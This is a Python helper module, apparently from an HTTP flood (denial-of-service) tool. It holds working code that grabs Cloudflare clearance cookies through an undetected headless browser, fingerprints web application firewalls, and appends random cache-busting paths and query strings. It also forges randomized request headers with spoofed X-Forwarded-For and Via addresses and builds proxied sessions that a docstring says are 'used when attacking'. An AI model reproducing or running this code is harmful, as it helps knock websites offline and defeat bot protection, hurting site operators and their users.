# import modules
import os, requests, socket, time
from random import randint, choice, shuffle, random
from string import ascii_letters, digits, ascii_uppercase
from netaddr import IPAddress, IPNetwork
from urllib.parse import urlparse
from src.core import *
import undetected_chromedriver as webdriver
#from selenium import webdriver
#from selenium.webdriver.firefox.options import Options as ffOptions
#from selenium.webdriver.chrome.options import Options as chrOptions
#from selenium.webdriver.firefox.firefox_profile import FirefoxProfile

ualist = []
with open('src/lists/useragents.txt', 'r', buffering=(2048*2048)) as uafile:
    [ualist.append(line.strip('\n')) for line in uafile.readlines()]

reflist = []
with open('src/lists/referers.txt', 'r', buffering=(2048*2048)) as reffile:
    [reflist.append(line.strip('\n')) for line in reffile.readlines()]

orlist = []
with open('src/lists/open redirects.txt', 'r', buffering=(2048*2048)) as orfile:
    [orlist.append(line.strip('\n')) for line in orfile.readlines()]

keywords = []
with open('src/lists/keywords.txt', 'r', buffering=(2048*2048)) as kwfile:
    [keywords.append(line.strip('\n')) for line in kwfile.readlines()]

cf_ips = []
with open('src/lists/cf_ips.txt', 'r', buffering=(2048*2048)) as cffile:
    [cf_ips.append(line.rstrip()) for line in cffile.readlines()]

def get_cookie(url):
    '''
    Gets CF cookie, which is basically a entry ticket
    '''

    options = webdriver.ChromeOptions()
    arguments = [
        '--no-sandbox', 
        '--disable-setuid-sandbox', 
        '--disable-infobars', 
        '--disable-logging', 
        '--disable-login-animations',
        '--disable-notifications', 
        '--disable-gpu', 
        '--headless', 
        '--lang=ko_KR', 
        '--start-maxmized',
        '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
    ]

    for argument in arguments:
        options.add_argument(argument)

    driver = webdriver.Chrome(options=options, driver_executable_path='src\\drivers\\chromedriver.exe')
    driver.implicitly_wait(3)
    driver.get(url)

    for _ in range(60):
        cookies = driver.get_cookies()
        tryy = 0

        for i in cookies:
            if i['name'] == 'cf_clearance':
                Core.bypass_cookieJAR = driver.get_cookies()[tryy]
                Core.bypass_useragent = driver.execute_script("return navigator.userAgent")
                Core.bypass_cookie = f"{Core.bypass_cookieJAR['name']}={Core.bypass_cookieJAR['value']}"
                driver.quit()

                return True
            else:
                tryy += 1
                pass

        time.sleep(1)
    driver.quit()
    return False

def fwDetect(url):
    '''
    Function to detect firewalls
    '''
    
    fwdict = {
        'cloudflare': 'Cloudflare Inc', 'cloudflare-nginx': 'Cloudflare Inc', 'cf-ray': 'Cloudflare Inc',
        'sucuri/cloudproxy': 'Sucuri',
        'wordfence': 'WordFence',
        'akamai': 'Akamai',
        'comodo': 'Comodo',
        'incapsula': 'Incapsula',
        'mod_security': 'ModSecurity',
        '360': '360 Web Application Firewall'
    }

    try:
        for i in cf_ips: # first we check if its CF only
            if IPAddress(socket.gethostbyname(urlparse(url).netloc)) in IPNetwork(i):
                return 'Cloudflare Inc'

        req = requests.get(url)
        server_header = req.headers.get('server')
        firewall = server_header if server_header.lower() in fwdict.keys() else None # first we try it with HTTP header checking
        if firewall is None: # then we try it by looking through the webpage contents
            for fw_ident, fw_name in fwdict.items():
                if fw_ident in req.text.lower(): return fw_name
                else: pass

        if firewall is None: # if its still None, we try HTTP response code checking
            if req.status_code == 406 or req.status_code == 501: firewall = 'ModSecurity'
            elif req.status_code == 999: firewall = 'WebKnight'
            elif req.status_code == 419: firewall = 'F5 BIG IP'
            else: firewall = 'Unknown' # last resort
    except: return 'Exception while checking'
    return firewall

def isIPv4(ip):
    '''
    Function to check if a IP is a valid IPv4 address
    '''

    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts)

def isIPv6(ip):
    '''
    Function to check if a IP is a valid IPv6 address'''

    try:
        socket.inet_pton(socket.AF_INET6, ip)

        return True
    except:
        return False

def isCF(ip): # credits to Wreckuests
    '''
    Function to check if a IP is in cloudflare's ranges
    '''

    for i in cf_ips:
        if (IPAddress(ip) in IPNetwork(i)):
            return True

def calcbestworkers():
    ''' 
    Function to calculate the best workers, in terms of rps
    '''

    sorted_dict = {}
    unsorted_dict = dict(sorted(Core.infodict.items(), key=lambda x:x[1]['req_sent'], reverse=True))
    [sorted_dict.update({x: y}) for x, y in unsorted_dict.items()]

    return sorted_dict

def clear():
    ''' 
    Simple function to clear screen
    '''

    try: os.system('cls' if os.name == 'nt' else 'clear')
    except: pass

def randip():
    '''
    Function to generate random IPv4 address
    '''

    p1, p2, p3, p4 = str(randint(0, 256)),str(randint(0, 256)),str(randint(0, 256)),str(randint(0, 256))

    return f'{p1}.{p2}.{p3}.{p4}'

def randstr(strlen, chars=ascii_letters):
    '''
    Function to generate a random string
    '''
    
    return ''.join(choice(chars) for _ in range(strlen))

class HTTPAdapter(requests.adapters.HTTPAdapter):
    '''
    HTTP adapter which allows socket modification
    '''

    # stolen from stackoverflow xd
    def __init__(self, *args, **kwargs):
        self.socket_options = kwargs.pop("socket_options", None)
        super(HTTPAdapter, self).__init__(*args, **kwargs)

    def init_poolmanager(self, *args, **kwargs):
        if self.socket_options is not None:
            kwargs["socket_options"] = self.socket_options
        super(HTTPAdapter, self).init_poolmanager(*args, **kwargs)

def createsession(verify=False, trust_env=False):
    '''
    Function that creates a requests session object used when attacking
    '''

    adapter = HTTPAdapter(socket_options=[
        (socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1), 
        (socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 5), 
        (socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5), 
        (socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    ])

    session = requests.session()
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.verify = verify
    session.trust_env = trust_env

    if Core.proxy != None: # sets proxy
        proxurl = f'{Core.proxy_type.lower()}{"h" if Core.proxy_resolve is True else ""}://{Core.proxy_user if Core.proxy_user != None else ""}{":"+Core.proxy_passw if Core.proxy_passw != None else ""}{"@" if Core.proxy_user != None else "@" if Core.proxy_passw != None else ""}{Core.proxy}'
        session.proxies = { 'http': proxurl, 'https': proxurl }
    else: session.proxies = {}

    return session

def buildblock(url):
    '''
    Function to generate a block that gets appened to the target url
    '''
    
    if Core.bypass_cache:
        block = '' if url != None and url.endswith('/') else '/' if url != None and not url.endswith('/') else ''

        block += randstr(randint(5, 10))
        for _ in range(randint(2, 10)):
            if randint(0, 1) == 1: block += f'/{randstr(randint(5, 10))}'
            else: block += f'/{randstr(randint(5, 10), chars=digits)}'
        
        block += f'?q={choice(keywords).replace(" ", "+")}'

        for _ in range(randint(2, 9)):
            if randint(0, 1) == 1: block += f'&{randstr(randint(5, 10))}={choice(keywords).replace(" ", "+")}'
            else: block += f'&{choice(keywords).replace(" ", "+")}={choice(keywords).replace(" ", "+")}'
        
        return block
    else:
        return ''

def buildheaders(url, useragent, referer):
    '''
    Function to generate randomized headers
    '''

    reflist.append(url+buildblock(url))

    cache_controls = ['no-cache', 'max-age=0']
    accept_encodings = ['*', 'identity', 'gzip', 'deflate']
    accept_charsets = ['ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15']
    content_types = ['multipart/form-data', 'application/x-url-encoded']
    accepts = ['*/*', 'application/json', 'text/html', 'application/xhtml+xml', 'application/xml', 'image/webp', 'image/*']
    # we shuffle em
    for toshuffle in [cache_controls, accept_encodings, accept_charsets, content_types, accepts]:
        shuffle(toshuffle)
    
    if randint(0,1) == 1: headers = { 'X-Requested-With': 'XMLHttpRequest'}
    else: headers = { 'User-Agent': choice(ualist) if useragent == None else useragent }

    headers.update({
        'Cache-Control': ', '.join(cache_controls[:randint(1,len(cache_controls))]),
        'Accept-Encoding': ', '.join(accept_encodings[:randint(1,len(accept_encodings))]),
        'Accept': ', '.join(accepts[:randint(1,len(accepts))])
    })

    # "random" headers
    if randint(0,1) == 1:
        charsets = f'{accept_charsets[0]},{accept_charsets[1]};q={str(round(random(), 1))},*;q={str(round(random(), 1))}'
        headers.update({'Accept-Charset': charsets})

    if randint(0,1) == 1:
        rand_referer = choice(reflist)
        headers.update({'Referer': rand_referer+buildblock(rand_referer) if referer == None else referer})
    
    if randint(0,1) == 1:
        headers.update({'Content-Type': choice(content_types)})
    
    if randint(0,1) == 1:
        headers.update({'Cookie': randstr(randint(60, 90), chars=ascii_uppercase+str(digits))})
    
    if randint(0,1) == 1:
        spoofip = randip()
        headers.update({
            'Via': spoofip,
            'X-Forwarded-For': spoofip
        })
    
    return headers

'''
def getdriver(useragent):
    driver = None
    if Core.browser_type == 'FIREFOX':
        useragents = [
            "Mozilla/5.0 (Windows NT 5.1; rv:50.0) Gecko/20100101 Firefox/50.0",
            "Mozilla/5.0 (Windows NT 5.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
            "Mozilla/5.0 (Windows NT 6.0; rv:50.0) Gecko/20100101 Firefox/50.0",
            "Mozilla/5.0 (Windows NT 6.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
            "Mozilla/5.0 (Windows NT 6.1; MNCache; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0 Cyberfox/50.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0 IceDragon/50.0.0.2",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/50.0 slurp",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0 IceDragon/50.0.0.2",
            "Mozilla/5.0 (Windows NT 6.2; rv:50.0) Gecko/20100101 Firefox/50.0",
            "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
            "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
            "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
            "Mozilla/5.0 (Windows NT 10.0; rv:50.0) Gecko/20100101 Firefox/50.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0 FirePHP/0.7.4",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0 IceDragon/50.0.0.2",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0.2",
            "Mozilla/5.0 (Windows NT 5.1; rv:51.0) Gecko/20100101 Firefox/51.0",
            "Mozilla/5.0 (Windows NT 5.2; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0",
            "Mozilla/5.0 (Windows NT 6.0; rv:51.0) Gecko/20100101 Firefox/51.0",
            "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0",
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 Gecko/20100101 Firefox/51.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:51.0) Gecko/20100101 Firefox/51.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:51.0) Gecko/20100101 Goanna/2.2 Firefox/51.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:51.0) Gecko/20100101 Firefox/51.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0 ColdFire/1.11.208.251"
        ]

        ff_profile = webdriver.FirefoxProfile()
        for key, value in {
            'general.useragent.override': choice(useragents) if useragent != None else useragent,
            'config.trim_on_minimize': True,
            'nglayout.initialpaint.delay': 0,
            'content.notify.backoffcount': 5,
            'content.notify.interval': 849999,
            'content.interrupt.parsing': True,
            'browser.blink_allowed': False,
            'ui.submenuDelay': 0,
            'security.dialog_enable_delay': 0,
            'network.prefetch-next': False,
            'layout.frame_rate.precise': True,
            'webgl.force-enabled': True,
            'layers.acceleration.force-enabled': True,
            'layers.offmainthreadcomposition.enabled': True,
            'layers.offmainthreadcomposition.async-animations': True,
            'layers.async-video.enabled': True,
            'html5.offmainthread': True,
            'browser.cache.memory.capacity': 128,
            'browser.tabs.animate': False,
            'browser.download.animateNotifications': False,
            'javascript.options.mem.high_water_mark': 128}.items():
            try: ff_profile.set_preference(key, value)
            except: pass

        ff_options = ffOptions()
        ff_options.add_argument('--headless')
        ff_options.add_argument('--safe-mode')
        ff_options.add_argument('--no-remote')
        ff_options.add_argument('--private')

        driver = webdriver.Firefox(executable_path='src/drivers/geckodriver.exe', options=ff_options, firefox_profile=ff_profile)

    elif Core.browser_type == 'CHROME':
        useragents = [
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.1331.54 Safari/537.36",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 UBrowser/6.1.2909.1022 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 UBrowser/6.1.2909.1022 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 UBrowser/6.0.1471.813 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 UBrowser/6.1.2015.1007 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 UBrowser/6.1.2107.204 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 UBrowser/6.1.2909.1213 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 UBrowser/6.0.1308.1016 Safari/420815",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 UBrowser/6.1.2015.1007 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 UBrowser/6.1.2909.1022 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 UBrowser/6.1.2015.1007 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 UBrowser/6.0.1471.914 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 UBrowser/6.1.2015.1007 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 UBrowser/6.1.2909.1022 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.18 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36",
        ]

        options = chrOptions()
        options.add_argument('--headless')
        options.add_argument('--disable-extensions')
        options.add_argument('--profile-directory=Default')
        options.add_argument("--incognito")
        options.add_argument("--disable-plugins-discovery")
        options.add_argument(f'user-agent={userAgent}')
        driver = webdriver.Chrome(chrome_options=options, executable_path='/src/drivers/chromedriver.exe')
    else:
        sys.exit('No driver found.')

    #driver.delete_all_cookies()
    return driver
'''